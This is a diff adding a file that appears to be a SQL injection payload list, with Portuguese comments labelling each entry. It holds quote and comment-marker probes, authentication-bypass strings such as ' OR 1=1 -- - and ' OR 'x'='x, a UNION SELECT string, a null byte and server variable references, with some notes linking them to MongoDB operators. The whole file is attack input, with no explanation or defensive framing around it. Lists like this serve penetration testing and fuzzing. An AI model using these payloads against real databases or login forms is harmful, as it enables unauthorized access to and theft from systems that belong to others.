@@ -1,0 +1,34 @@
+'  // Apostrophe
+'' // Dupla Apostrophe
+`  // Backtick
+`` // Dupla Backtick
+,  // Vírgula
+"  // Aspas Duplas
+"" // Dupla Aspas Duplas
+/  // Barra
+// // Barra e Barra
+\  // Barra Invertida
+\\ // Dupla Barra Invertida
+;  // Ponto e Vírgula
+' or "  // Apostrophe or Aspas Duplas
+-- or #  // Comentário em SQL
+' OR '1'  // Apostrophe OR 1
+' OR 1 -- - // Apostrophe OR 1 e Comentário
+" OR "" = "  // Aspas Duplas OR Aspas Duplas = Aspas Duplas
+" OR 1 = 1 -- -  // Aspas Duplas OR 1 = 1 e Comentário
+' OR '' = '  // Apostrophe OR Apostrophe = Apostrophe
+'='  // Igual
+'LIKE'  // LIKE (similar ao operador $regex em MongoDB)
+'=0--+  // Igual a 0 e Comentário
+OR 1=1  // OR 1 = 1
+' OR 'x'='x  // Apostrophe OR 'x' = 'x'
+' AND id IS NULL; --  // Apostrophe AND id IS NULL e Comentário
+'''''''''''''UNION SELECT '2  // Muitos Apostrophes e UNION
+%00  // Null Byte
+/*…*/  // Comentário C-style
++   // Adição
+||  // Concatenar (simboliza o operador $concat em MongoDB)
+%   // Coringa (simboliza o operador $regex em MongoDB)
+
+@variable   // Variável Local
+@@variable  // Variável Global
